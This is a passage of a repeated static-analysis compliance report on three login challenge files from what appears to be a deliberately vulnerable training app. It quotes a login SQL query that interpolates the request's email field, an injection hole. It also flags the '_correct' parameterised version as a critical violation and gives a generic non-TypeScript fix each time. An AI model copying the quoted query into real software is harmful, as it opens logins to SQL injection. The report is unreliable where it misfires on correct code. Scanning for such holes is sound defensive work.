| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginBenderChallenge_4.ts`
**Scanned at**: 2026-10-11T16:33:50.815122+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: f...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginBenderChallenge_3.ts`
**Scanned at**: 2026-10-11T16:33:51.074453+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = :mail AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginBenderChallenge_2_correct.ts`
**Scanned at**: 2026-10-11T16:33:51.189688+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $mail AND password = $pass AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": 